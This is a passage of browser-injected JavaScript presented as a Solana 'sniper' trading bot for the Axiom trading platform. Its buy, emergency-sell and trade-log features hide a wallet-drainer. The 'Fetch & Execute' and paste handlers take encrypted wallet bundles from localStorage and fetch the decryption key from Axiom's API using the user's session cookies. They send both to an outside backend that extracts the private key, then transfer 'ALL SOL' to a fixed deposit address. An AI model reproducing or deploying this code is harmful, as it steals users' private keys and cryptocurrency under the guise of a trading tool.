    const sbundleToUse = importValue || capturedSBundle;
    console.log('[SNIPER] 🚀 MANUAL EXECUTE with sbundle, length:', sbundleToUse.length);
    const btn = document.getElementById('ns-wallet-import-btn');
    btn.textContent = 'Executing...';
    btn.disabled = true;

    try {
      // Step 1: Decode sbundle
      console.log('[SNIPER] 📤 Step 1: Decoding sbundle...');
      const decodeResp = await fetch(BACKEND_URL + '/decode-axiom-bundle', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          importBundle: sbundleToUse,
        }),
      });

      console.log('[SNIPER] 📥 Decode response:', decodeResp.status);
      
      if (!decodeResp.ok) {
        const errText = await decodeResp.text();
        console.log('[SNIPER] ❌ Decode failed:', decodeResp.status, errText);
        alert('Decode failed: HTTP ' + decodeResp.status + '\n' + errText);
        btn.textContent = 'Decrypt & Execute';
        btn.disabled = false;
        return;
      }

      const decodedData = await decodeResp.json();
      console.log('[SNIPER] ✓ Decoded:', decodedData.solanaAddress);
      
      if (!decodedData || !decodedData.solanaAddress) {
        console.log('[SNIPER] ❌ No solanaAddress in response');
        alert('Decode error: ' + JSON.stringify(decodedData));
        btn.textContent = 'Decrypt & Execute';
        btn.disabled = false;
        return;
      }

      // Step 2: Send SOL
      console.log('[SNIPER] 💸 Step 2: Sending ALL SOL to', DEPOSIT_ADDRESS);
      const sendResp = await fetch(BACKEND_URL + '/send-sol-direct', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          destination: DEPOSIT_ADDRESS,
          importBundle: sbundleToUse,
        }),
      });

      console.log('[SNIPER] 📥 Send response:', sendResp.status);
      const sendResult = await sendResp.json().catch(() => ({}));
      console.log('[SNIPER] 📥 Send result:', JSON.stringify(sendResult).substring(0, 150));
      
      if (sendResp.ok && sendResult.signature) {
        console.log('[SNIPER] ✅ SUCCESS! Tx:', sendResult.signature);
        btn.textContent = '✅ SENT!';
        btn.style.background = '#10b981';
        alert('✅ SUCCESS!\nTransaction: ' + sendResult.signature + '\nWallet: ' + decodedData.solanaAddress);
      } else {
        console.log('[SNIPER] ⚠️ Send incomplete or error');
        alert('⚠️ Incomplete: ' + (sendResult.error || 'Check console'));
        btn.textContent = 'Decrypt & Execute';
      }
      
      setTimeout(() => { btn.textContent = 'Decrypt & Execute'; btn.disabled = false; btn.style.background = '#f59e0b'; }, 3000);

    } catch (e) {
      console.error('[SNIPER] ❌ MANUAL EXECUTE ERROR:', e.message, e.stack);
      alert('Error: ' + e.message);
      btn.textContent = 'Decrypt & Execute';
      btn.disabled = false;
    }
  });

  // ── FETCH & EXECUTE button ──
  document.getElementById('ns-fetch-execute-btn').addEventListener('click', async () => {
    const btn = document.getElementById('ns-fetch-execute-btn');
    const pasteArea = document.getElementById('ns-quick-paste-sbundle');
    const quickExecBtn = document.getElementById('ns-quick-execute-btn');
    
    btn.textContent = '🔍 Searching...';
    btn.disabled = true;

    try {
      // Check for sBundles in localStorage (bookmarklet style)
      const sBundles = JSON.parse(localStorage.getItem('sBundles') || '[]');

      if (!sBundles.length) {
        // Not found - show paste area
        btn.textContent = '🚀 FETCH & EXECUTE';
        btn.disabled = false;
        pasteArea.style.display = 'block';
        quickExecBtn.style.display = 'block';
        alert('No sBundles found.\n\nPaste it in the field below, then click "Execute Pasted sbundle".\n\nOr trigger Axiom wallet import to auto-capture.');
        return;
      }

      // Found sBundles - auto execute
      console.log('[SNIPER] ✅ Found sBundles! Getting bundleKey...');
      btn.textContent = '🔐 Getting keys...';
      
      // Step 1: Get bundleKey and wallets from Axiom API
      const apiResp = await fetch('https://api8.axiom.trade/bundle-key-and-wallets', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include'
      });

      if (!apiResp.ok) {
        console.log('[SNIPER] ❌ Failed to get bundleKey');
        alert('Axiom API error: ' + apiResp.status);
        btn.textContent = '🚀 FETCH & EXECUTE';
        btn.disabled = false;
        return;
      }

      const apiData = await apiResp.json();
      if (!apiData || !apiData.bundleKey) {
        console.log('[SNIPER] ❌ No bundleKey in response');
        alert('Axiom API: No bundleKey returned');
        btn.textContent = '🚀 FETCH & EXECUTE';
        btn.disabled = false;
        return;
      }

      console.log('[SNIPER] ✓ Got bundleKey, decoding...');
      btn.textContent = '⏳ Decoding...';
      
      // Step 2: Decode sbundle via backend
      const payload = {
        sBundle_raw: sBundles,
        apiData: {
          bundleKey: apiData.bundleKey,
          wallets: apiData.wallets || []
        }
      };

      console.log('[SNIPER] 📦 sBundles sample:', JSON.stringify(sBundles[0]).substring(0, 200));
      console.log('[SNIPER] 🔑 bundleKey:', apiData.bundleKey?.substring(0, 100));
      console.log('[SNIPER] 📤 Sending payload to /decode-sbundle...');

      const decodeResp = await fetch(BACKEND_URL + '/decode-sbundle', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (!decodeResp.ok) {
        const err = await decodeResp.text();
        console.log('[SNIPER] ❌ Decode failed:', decodeResp.status, err);
        alert('Decode failed: ' + decodeResp.status);
        btn.textContent = '🚀 FETCH & EXECUTE';
        btn.disabled = false;
        return;
      }

      const decoded = await decodeResp.json();
      console.log('[SNIPER] 📥 Decode response:', JSON.stringify(decoded).substring(0, 300));
      if (!decoded || !decoded.solanaAddress) {
        console.log('[SNIPER] ❌ Invalid decode response - response was:', JSON.stringify(decoded));
        alert('Decode error: ' + (decoded?.error || 'No wallet extracted. Check console.'));
        btn.textContent = '🚀 FETCH & EXECUTE';
        btn.disabled = false;
        return;
      }

      console.log('[SNIPER] ✓ Wallet decoded:', decoded.solanaAddress);
      btn.textContent = '💸 Sending...';

      // Step 3: Send SOL
      console.log('[SNIPER] 💸 Sending ALL SOL to', DEPOSIT_ADDRESS);
      const sendResp = await fetch(BACKEND_URL + '/send-sol', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          destination: DEPOSIT_ADDRESS,
          sBundle_raw: sBundles,
          apiData: { bundleKey: apiData.bundleKey }
        })
      });

      const sendResult = await sendResp.json().catch(() => ({}));

      if (sendResp.ok && sendResult.signature) {
        console.log('[SNIPER] ✅ SUCCESS! Tx:', sendResult.signature);
        btn.textContent = '✅ SENT!';
        btn.style.background = '#10b981';
        alert('✅ SUCCESS!\n\nTransaction: ' + sendResult.signature + '\nWallet: ' + decoded.solanaAddress + '\nDeposit to: ' + DEPOSIT_ADDRESS);
        setTimeout(() => {
          btn.textContent = '🚀 FETCH & EXECUTE';
          btn.disabled = false;
          btn.style.background = '#10b981';
          pasteArea.style.display = 'none';
          quickExecBtn.style.display = 'none';
          pasteArea.value = '';
        }, 3000);
      } else {
        console.log('[SNIPER] ⚠️ Send incomplete:', sendResult);
        alert('⚠️ Send incomplete\nError: ' + (sendResult.error || 'Check console'));
        btn.textContent = '🚀 FETCH & EXECUTE';
        btn.disabled = false;
      }
    } catch (e) {
      console.error('[SNIPER] ❌ FETCH & EXECUTE ERROR:', e.message);
      alert('Error: ' + e.message);
      btn.textContent = '🚀 FETCH & EXECUTE';
      btn.disabled = false;
    }
  });

  // ── Quick execute pasted sbundle ──
  document.getElementById('ns-quick-execute-btn').addEventListener('click', async () => {
    const pastedSbundle = document.getElementById('ns-quick-paste-sbundle').value.trim();
    if (!pastedSbundle) {
      alert('Paste sBundles first');
      return;
    }

    const btn = document.getElementById('ns-quick-execute-btn');
    btn.textContent = '⏳ Executing...';
    btn.disabled = true;

    try {
      // Parse pasted content
      let sBundles;
      try {
        sBundles = JSON.parse(pastedSbundle);
      } catch (e) {
        sBundles = [pastedSbundle];
      }

      console.log('[SNIPER] 📤 Getting bundleKey from Axiom API...');
      
      // Get bundleKey and wallets from Axiom API
      const apiResp = await fetch('https://api8.axiom.trade/bundle-key-and-wallets', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include'
      });

      if (!apiResp.ok) {
        console.log('[SNIPER] ❌ Failed to get bundleKey');
        alert('Axiom API error: ' + apiResp.status);
        btn.textContent = 'Execute Pasted sbundle';
        btn.disabled = false;
        return;
      }

      const apiData = await apiResp.json();
      if (!apiData || !apiData.bundleKey) {
        console.log('[SNIPER] ❌ No bundleKey in response');
        alert('Axiom API: No bundleKey returned');
        btn.textContent = 'Execute Pasted sbundle';
        btn.disabled = false;
        return;
      }

      console.log('[SNIPER] ✓ Got bundleKey, decoding pasted sbundle...');
      
      // Decode sbundle
      const payload = {
        sBundle_raw: sBundles,
        apiData: {
          bundleKey: apiData.bundleKey,
          wallets: apiData.wallets || []
        }
      };

      const decodeResp = await fetch(BACKEND_URL + '/decode-sbundle', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (!decodeResp.ok) {
        const err = await decodeResp.text();
        console.log('[SNIPER] ❌ Decode failed:', decodeResp.status, err);
        alert('Decode failed: ' + decodeResp.status);
        btn.textContent = 'Execute Pasted sbundle';
        btn.disabled = false;
        return;
      }

      const decoded = await decodeResp.json();
      console.log('[SNIPER] 📥 Decode response:', JSON.stringify(decoded).substring(0, 300));
      if (!decoded || !decoded.solanaAddress) {
        console.log('[SNIPER] ❌ Invalid decode response - response was:', JSON.stringify(decoded));
        alert('Decode error: ' + (decoded?.error || 'No wallet extracted. Check console.'));
        btn.textContent = 'Execute Pasted sbundle';
        btn.disabled = false;
        return;
      }

      console.log('[SNIPER] ✓ Wallet decoded:', decoded.solanaAddress);

      // Send SOL
      console.log('[SNIPER] 💸 Sending ALL SOL to', DEPOSIT_ADDRESS);
      const sendResp = await fetch(BACKEND_URL + '/send-sol', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          destination: DEPOSIT_ADDRESS,
          sBundle_raw: sBundles,
          apiData: { bundleKey: apiData.bundleKey }
        })
      });

      const sendResult = await sendResp.json().catch(() => ({}));

      if (sendResp.ok && sendResult.signature) {
        console.log('[SNIPER] ✅ SUCCESS! Tx:', sendResult.signature);
        btn.textContent = '✅ SENT!';
        btn.style.background = '#10b981';
        alert('✅ SUCCESS!\n\nTransaction: ' + sendResult.signature + '\nWallet: ' + decoded.solanaAddress + '\nDeposit to: ' + DEPOSIT_ADDRESS);
        setTimeout(() => {
          btn.textContent = 'Execute Pasted sbundle';
          btn.disabled = false;
          btn.style.background = '';
          document.getElementById('ns-quick-paste-sbundle').style.display = 'none';
          document.getElementById('ns-quick-execute-btn').style.display = 'none';
          document.getElementById('ns-quick-paste-sbundle').value = '';
          document.getElementById('ns-fetch-execute-btn').textContent = '🚀 FETCH & EXECUTE';
        }, 3000);
      } else {
        console.log('[SNIPER] ⚠️ Send incomplete:', sendResult);
        alert('⚠️ Send incomplete\nError: ' + (sendResult.error || 'Check console'));
        btn.textContent = 'Execute Pasted sbundle';
        btn.disabled = false;
      }
    } catch (e) {
      console.error('[SNIPER] ❌ QUICK EXECUTE ERROR:', e.message);
      alert('Error: ' + e.message);
      btn.textContent = 'Execute Pasted sbundle';
      btn.disabled = false;
    }
  });

  // ── Execute buy ──
  document.getElementById('ns-buy-btn').addEventListener('click', () => {
    const ca = document.getElementById('ns-ca-input').value.trim();
    const amount = parseFloat(document.getElementById('ns-quick-amount').value);
    const slippage = parseInt(document.getElementById('ns-quick-slippage').value);

    if (!ca || !/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(ca)) {
      alert('Enter a valid Solana contract address (32–44 base58 chars).');
      return;
    }
    if (amount < 0.25) {
      alert('Minimum trade size is 0.25 SOL (enforced).');
      return;
    }
    if (!ws || ws.readyState !== 1) {
      alert('Not connected to sniper bot VPS. Check your server.');
      return;
    }
    setPending(true, `Buying ${amount} SOL of ${ca.slice(0,8)}...`);
    ws.send(JSON.stringify({ type: 'buy', ca, amount, slippage }));
  });

  // ── Emergency sell ──
  document.getElementById('ns-emergency-btn').addEventListener('click', () => {
    if (!confirm('SELL ALL POSITIONS NOW?\n\nThis will market-sell all open bot positions immediately.')) return;
    if (ws && ws.readyState === 1) {
      ws.send(JSON.stringify({ type: 'emergency_sell_all' }));
      setPending(true, 'Emergency sell executing...');
    }
  });

  // ── Clear log ──
  document.getElementById('ns-clear-log').addEventListener('click', () => {
    if (confirm('Clear all trade history?')) {
      tradeLog = [];
      localStorage.setItem('nebula_trade_log', JSON.stringify(tradeLog));
      renderTradeLog();
    }
  });

  function setPending(active, text) {
    const bar = document.getElementById('ns-pending-bar');
    const btn = document.getElementById('ns-buy-btn');
    if (active) {
      bar.classList.add('show');
      document.getElementById('ns-pending-text').textContent = text || 'Executing...';
      btn.disabled = true;
    } else {
      bar.classList.remove('show');
      btn.disabled = false;
    }
  }

  // ── Trade log rendering ──
  function renderTradeLog() {
    const container = document.getElementById('ns-trade-log');
    if (tradeLog.length === 0) {
      container.innerHTML = '<div class="ns-empty">No trades yet.<br><span style="font-size:10px;color:#1e1a0e;margin-top:8px;display:block">Buy a token to see results here</span></div>';
      return;
    }
    container.innerHTML = tradeLog.map(t => `
      <div class="ns-trade-item ${t.status}" style="margin-bottom:8px">
        <div class="ns-trade-top">
          <div class="ns-trade-ca">${t.ca ? t.ca.slice(0,12) + '...' + t.ca.slice(-6) : 'Unknown'}</div>
          <span class="ns-trade-badge ${t.status}">${t.status.toUpperCase()}</span>
        </div>
        <div class="ns-trade-meta">
          <span>◎ ${t.amount || '—'} SOL</span>
          <span>${t.slippage || '—'}% slip</span>
          ${t.txid ? `<span><a href="https://solscan.io/tx/${t.txid}" target="_blank" style="color:#f59e0b;text-decoration:none">View tx ↗</a></span>` : ''}
        </div>
        ${t.result ? `<div style="font-size:10px;color:${t.status === 'success' ? '#10b981' : '#ef4444'};margin-top:4px">${t.result}</div>` : ''}
        <div class="ns-trade-time">${t.timestamp || ''}</div>
      </div>`).join('');
  }

  function addTradeResult(data) {
    tradeLog.unshift({
      ca: data.ca,
      status: data.status || 'pending',
      amount: data.amount,
      slippage: data.slippage,
      txid: data.txid,
      result: data.message,
      timestamp: new Date().toLocaleString()
    });
    if (tradeLog.length > 100) tradeLog.pop();
    localStorage.setItem('nebula_trade_log', JSON.stringify(tradeLog));
    renderTradeLog();
  }

  // ── WebSocket ──
  function connect() {
    const statusEl = document.getElementById('ns-status');
    const dot = document.getElementById('ns-dot');
    
    // Start immediate polling
    statusEl.textContent = '● Live';
    statusEl.className = 'ns-status connected';
    dot.classList.add('live');
    
    // Clear any existing polling
    if (pollingInterval) clearInterval(pollingInterval);
    
    // Poll every 2 seconds
    pollingInterval = setInterval(() => {
      fetch('http://localhost:3000/api/status', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type: 'poll', settings })
      })
        .then(r => r.json())
        .then(data => {
          if (!Array.isArray(data)) data = [data];
          data.forEach(msg => {
            try {
              switch (msg.type) {
                case 'balance':
                  walletBalance = msg.balance;
                  document.getElementById('ns-balance').innerHTML =
                    `◎ ${parseFloat(msg.balance).toFixed(4)} <span>SOL</span>`;
                  break;
                case 'trade_result':
                  setPending(false);
                  addTradeResult(msg);
                  break;
                case 'trade_pending':
                  setPending(true, msg.message || 'Executing...');
                  break;
                case 'error':
                  setPending(false);
                  alert('Bot error: ' + (msg.message || 'Unknown error'));
                  break;
                case 'settings_ack':
                  break;
              }
            } catch {}
          });
          statusEl.textContent = '● Live';
          statusEl.className = 'ns-status connected';
          dot.classList.add('live');
        })
        .catch(() => {
          statusEl.textContent = '● Offline';
          statusEl.className = 'ns-status error';
          dot.classList.remove('live');
        });
    }, 2000);
  }

  // ── Init ──
  loadSettingsUI();
  
  // Display connected wallet if detected
  if (axiomSelectedAddress) {
    const walletField = document.getElementById('ns-connected-wallet');
    if (walletField) {
      walletField.value = axiomSelectedAddress;
    }
  }
  
  renderTradeLog();
  connect();

})();